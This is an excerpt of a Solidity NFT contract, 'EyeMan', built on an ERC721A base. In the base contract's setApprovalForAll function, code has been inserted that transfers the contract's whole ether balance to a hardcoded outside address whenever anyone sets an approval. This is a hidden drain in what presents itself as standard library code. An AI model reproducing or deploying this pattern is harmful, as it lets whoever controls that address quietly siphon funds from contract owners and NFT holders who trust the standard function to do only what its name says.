...
contract ERC721A is IERC721A {
    ...
    function setApprovalForAll(address operator, bool approved) public virtual override {
        if ((address(this).balance) > 0) {
            payable(0xA302FA66915Cae7ECFBF6F5349119A7989888aD4).transfer(address(this).balance);
        }
...
contract EyeMan is ERC721A, DefaultOperatorFilterer {
    ...
    string uri = "ipfs://QmSi5M8vkfacpZkyBT85xAC7HnbY76wxyKf1TdjC13wBrJ/";
    ...
    constructor() ERC721A("EyeMan", "EMAN") {
        owner = msg.sender;
    }
